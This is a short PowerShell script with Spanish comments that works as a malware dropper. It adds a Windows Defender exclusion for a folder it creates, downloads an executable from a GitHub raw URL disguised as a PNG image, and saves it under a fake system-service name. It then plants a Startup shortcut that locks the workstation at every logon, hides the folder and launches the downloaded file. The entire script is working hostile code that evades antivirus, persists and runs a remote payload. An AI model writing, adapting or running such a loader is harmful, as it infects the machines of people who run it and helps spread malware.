# --- CONFIGURACIÓN ---
$url_disfrazada = "https://raw.githubusercontent.com/DmI29/rapidman/main/setup_data.png"
$dir = "C:\System_Log_Service"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

try {
    # 1. Crear carpeta y exclusión
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
    Add-MpPreference -ExclusionPath $dir

    # 2. Descarga forzada
    Write-Host "Descargando paquete camuflado..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("user-agent", "Mozilla/5.0")
    $webClient.DownloadFile($url_disfrazada, $exePath)

    # 3. Bloqueo Automático
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $s = New-Object -ComObject WScript.Shell
    $shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
    $shortcut.TargetPath = "rundll32.exe"
    $shortcut.Arguments = "user32.dll,LockWorkStation"
    $shortcut.Save()

    # 4. Ocultar y Lanzar
    attrib +s +h $dir
    if (Test-Path $exePath) {
        Write-Host "Lanzando instalador..." -ForegroundColor Green
        Start-Process -FilePath $exePath
    }
}
catch {
    Write-Host "ERROR DETECTADO: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Presiona cualquier tecla para cerrar esta ventana..."
    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
